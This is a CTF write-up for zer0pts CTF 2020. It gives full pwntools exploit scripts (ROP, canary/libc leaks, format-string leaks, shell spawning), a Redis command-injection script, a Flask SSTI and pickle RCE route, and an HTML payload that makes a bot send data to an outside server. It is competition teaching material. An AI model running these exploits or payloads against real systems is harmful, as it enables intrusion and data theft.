# zer0pts CTF 2020

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200307-zer0ptsctf/) of this writeup.**


 - [zer0pts CTF 2020](#zer0pts-ctf-2020)
   - [Web](#web)
     - [notepad](#notepad)
     - [urlapp](#urlapp)
     - [Can you guess it?](#can-you-guess-it)
     - [MusicBlog](#musicblog)
   - [Pwn](#pwn)
     - [hipwn](#hipwn)
     - [protrude](#protrude)
     - [grimoire](#grimoire)


---

## Web

### notepad

There is a SSTI vulnerability in `page_not_found()` function. We can append `{{config}}` to a valid `Referer` header to leak the server `secret_key`:

```
SECRET_KEY': b'Sh\xe3e R\x95\xdb\xb19\xf9\x18\xc3\xf6\xeco'
```

Now we can forge a fake cookie to trigger the `pickle.loads(our_forged_data)` in `load()` function. We can get a reverse shell using the python pickle deserialization vulnerability.

I use [this](https://github.com/noraj/flask-session-cookie-manager) to create fake cookie.

Flag: `zer0pts{fl4sk_s3ss10n_4nd_pyth0n_RCE}`

### urlapp

This challenge's flag is already included in the Redis server with KEY `flag`. The service will store the requested url into the Redis server with a random 16-hexbytes KEY. For instance, if we requested `https://example.com` to the service, it will first create a random 16-hexbytes KEY, says `faceb00cdeadbeef`, then execute the following Redis command `SET faceb00cdeadbeef https://example.com`. Now if you request `https://[challenge]?q=faceb00cdeadbeef`, it will execute `GET faceb00cdeadbeef` Redis command and redirect you to the return value `https://example.com`.

We are allowed to inject arbitrary Redis command with newline in `POST` request `url` parameter.

One idea is that maybe we can append the flag value to a stored url, and since all the stderr will display to user, we can know what the flag is because the url is invalid.

```python
import requests

url = 'http://3.112.201.75:8004/'

query = {'url': 'http://[URL]/?q=\r\n'}
r = requests.post(url, data=query)
code = r.content[-16:]
print code

p1 = "SCRIPT LOAD \"redis.call('APPEND', KEYS[2], redis.call('GET', KEYS[1])); return 1;\"\r\n"
p2 = "EVALSHA 7614be2a5fac38857cd5a98f26d710f988d1b25f 2 flag {}\r\n".format(code)
query = {'url': 'http://[URL]/?q=\r\n' + p1 + p2}
r = requests.post(url, data=query)

r = requests.get(url + '?q={}'.format(code))
```

Flag: `zer0pts{sh0rt_t0_10ng_10ng_t0_sh0rt}`

### Can you guess it?

In this challenge, if we set the `source` parameter, it will read the content of `basename($_SERVER['PHP_SELF'])`

```php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

highlight_file(basename($_SERVER['PHP_SELF']));
```

And our target is the `config.php` file, but the regular expression is hard to bypass.

So I try to investigate the `basename()` function from [php-src](https://github.com/php/php-src) then I found this bug:

https://bugs.php.net/bug.php?id=62119

The final payload is:

`/index.php/config.php/喵`

=> `zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}`


### MusicBlog

This challenge allows us to add `<audio>` tag in the post content.

And the bot (worker) will click the "like" button of our post if we set the checkbox.

The flag is in the `User-agent` of the bot, so our target is to let the bot send a request to our server.

And there is a `strip_tags()` function, so it is hard to inject other HTML tags.

Although `<audio>` has `on*` events, we can't run any javascript because of the strict CSP.

The goal is obviously to clickjack the bot, so I look into the `strips_tags()` function.

Then I found this php bug in PHP 7.4.0:

https://bugs.php.net/bug.php?id=78814

So the final payload is :

`<a/udio id="like" href="http://kaibro.tw:9487">zzxc</a>`

We will get the request from the bot:

```
GET / HTTP/1.1
Host: kaibro.tw:9487
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: zer0pts{M4sh1m4fr3sh!!}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge/post.php?id=c8e7da47-b470-48b7-91cc-8bce3fd45cc3
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

## Pwn

### hipwn

```
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```C
#include <stdio.h>

int main(void) {
  char name[0x100];
  puts("What's your team name?");
  gets(name);
  printf("Hi, %s. Welcome to zer0pts CTF 2020!\n", name);
  return 0;
}
```

A very simple BOF, just create ROP to execute `execve("/bin/sh\x00")` syscall.

```python
#!/usr/bin/env python

import sys
from pwn import *

if len(sys.argv) == 1:
    r = process('./chall')
else:
    r = remote('13.231.207.73', 9010)

buf = 0x604300
pop_rax = 0x400121
pop_rdi = 0x40141c
pop_rsi_r15 = 0x40141a
pop_rdx = 0x4023f5
syscall = 0x4024dd

payload = 'A'*248 + '/bin/sh\x00' + p64(buf)
payload += p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(0x604360) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)
r.sendlineafter('name?\n', payload)

r.interactive()
```

Flag: `zer0pts{welcome_yokoso_osooseyo_huanying_dobropozhalovat}`

### protrude

```
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=e42523ac585386d5660842caf3c06fa61dcee15e, not stripped

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The challenge allocate `long` type with only 4 bytes (should be 8 bytes), so potential BOF.

One main challenge is to leak something without overwrite the canary. We can overwrite the index value `i` to skip overwritting canary value. Then we return to `calc_sum()` (0x400897) again. Now we have two total sum values:

First:

```
0x7fffffffe540: 0x0000000000000000      0x0000000000000000
0x7fffffffe550: 0x0000000000000000      0x0000000000000000
0x7fffffffe560: 0x0000000000000000      0x0000000000000000
0x7fffffffe570: 0x0000000000000000      0x0000000000000000
0x7fffffffe580: 0x0000000000000000      0x0000000000000000
0x7fffffffe590: 0x0000000000000000      0x0000000000000000
0x7fffffffe5a0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5b0: 0x0000000000000016      0x0000000000000000
0x7fffffffe5c0: 0x00007fffffffe540      0x5396b2b7f423f400
0x7fffffffe5d0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5e0: 0x00007fffffffe5f0      0x0000000000400897
```

Second:

```
0x7fffffffe580: 0x0000000000000000      0x0000000000000000
0x7fffffffe590: 0x0000000000000000      0x0000000000000000
0x7fffffffe5a0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5b0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5c0: 0x0000000000000016      0x0000000000000000
0x7fffffffe5d0: 0x00007fffffffe580      0x5396b2b7f423f400
0x7fffffffe5e0: 0x0000000000000000      0x0000000000000000
0x7fffffffe5f0: 0x0000000000000000      0x0000000000400897
0x7fffffffe600: 0x0000000000000000      0x0000000000000000
0x7fffffffe610: 0x0000000000000000      0x0000000000000000
0x7fffffffe620: 0x0000000000000000      0x0000000000000000
```

If we subtract the sum of these values, we can get the value of stack.

After leak the value of stack, we can perform ROP to leak libc address and get shell.

```python
#!/usr/bin/env python

import sys
from pwn import *

if len(sys.argv) == 1:
    r = process('./chall')
else:
    r = remote('13.231.207.73', 9005)

r.sendlineafter('n = ', '22')

for i in range(14):
    r.sendlineafter('= ', '0')

n = 0x6010b0
buf = 0x601b00
rip = 0x400897

r.sendlineafter('= ', '20')
r.sendlineafter('= ', str(rip))

r.recvuntil('SUM = ')
sum1 = int(r.recvline().strip())
log.info('sum1 = ' + str(sum1))
sum1 -= rip
sum1 -= 0x16*2

rip2 = 0x40088e
for i in range(8):
    r.sendlineafter('= ', '0')
r.sendlineafter('= ', '11')
for i in range(2):
    r.sendlineafter('= ', '0')
r.sendlineafter('= ', str(buf))
r.sendlineafter('= ', str(rip2))
for i in range(6):
    r.sendlineafter('= ', '0')

r.recvuntil('SUM = ')
sum2 = int(r.recvline().strip())
log.info('sum2 = ' + str(sum2))
sum2 -= buf
sum2 -= rip2
sum2 -= 0x16*2
sum2 -= 0x40

stack = sum1 - sum2 - 0xa4
log.info('stack: ' + hex(stack))

pop_rdi = 0x400a83
pop_rsi_r15 = 0x400a81
read_plt = 0x4006b0
leave_ret = 0x400849
r.sendlineafter('= ', str(buf))
r.sendlineafter('= ', str(pop_rdi))
r.sendlineafter('= ', str(0))
r.sendlineafter('= ', str(pop_rsi_r15))
r.sendlineafter('= ', str(buf))
r.sendlineafter('= ', str(0))
r.sendlineafter('= ', str(read_plt))
r.sendlineafter('= ', str(leave_ret))
for i in range(5):
    r.sendlineafter('= ', '0')
r.sendlineafter('= ', '18')
r.sendlineafter('= ', str(stack+8))
r.sendlineafter('= ', str(leave_ret))
r.sendlineafter('= ', '0')

puts_got = 0x601018
puts_plt = 0x400660
payload = p64(buf+0x100) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(buf) + p64(0) + p64(read_plt)
r.recvline()

r.sendline(payload)
libc = u64(r.recvline().strip().ljust(8, '\x00')) - 0x6f690
log.success('libc: ' + hex(libc))
one_gadget = libc + 0x4526a

r.sendline('A'*0x50 + p64(one_gadget) + '\x00'*0x100)

r.interactive()
```

Flag: `zer0pts{0ops_long_is_8_byt3s_l0ng}`

### grimoire

```
ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b25a8b9761a63b64746b00cc2eaf2d670f730495, not stripped

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Format string vulnerability in `error()`, use this to leak canary, libc, heap, stack, ...

`grimoire_edit()` can be used to overwrite `filepath`.

Open `/dev/stdin` and read 65535 bytes to trigger BOF. Overwrite ret address to one_gadget and get shell.

```python
#!/usr/bin/env python

import sys
from pwn import *

if len(sys.argv) == 1:
    r = process('./chall')
else:
    r = remote('13.231.207.73', 9008)

def openbook():
    r.sendlineafter('> ', '1')

def readbook():
    r.sendlineafter('> ', '2')

def editbook(offset, data, nl=1):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Offset: ', str(offset))
    if nl == 1:
        r.sendlineafter('Text: ', data)
    else:
        r.sendafter('Text: ', data)
        sleep(0.1)

def closebook():
    r.sendlineafter('> ', '4')

openbook()
readbook()
editbook(0, 'a'*0x200, nl=0)
readbook()
r.recvuntil('a'*0x200)
heap = u64(r.recvuntil('*', drop=True).ljust(8, '\x00'))
log.success('heap: ' + hex(heap))

editbook(0x200, p64(0) + p64(1) + p64(0)*2 + '%10$p\x00', nl=0)
openbook()
canary = int(r.recvuntil(':', drop=True), 16)
log.success('canary: ' + hex(canary))

editbook(0x200, p64(0) + p64(1) + p64(0)*2 + '%11$p\x00', nl=0)
openbook()
stack = int(r.recvuntil(':', drop=True), 16)
log.success('stack: ' + hex(stack))

editbook(0x200, p64(0) + p64(1) + p64(0)*2 + '%14$p\x00', nl=0)
openbook()
code = int(r.recvuntil(':', drop=True), 16) - 0x1045
log.success('code: ' + hex(code))

editbook(0x200, p64(0) + p64(1) + p64(0)*2 + '%22$p\x00', nl=0)
openbook()
libc = int(r.recvuntil(':', drop=True), 16) - 0x21b97
log.success('libc: ' + hex(libc))
one_gadget = libc + 0x4f322

editbook(0x200, p64(0) + p64(0) + p64(0)*2 + '/dev/stdin\x00', nl=0)
openbook()
readbook()
payload = p64(canary)*66 + p64(0) + p64(one_gadget)
payload = payload.ljust(65535, '\x00')
r.sendline(payload)
r.interactive()
```

Flag: `zer0pts{l0g1c4l_pwn_15_4_l0t_0f_fun}`
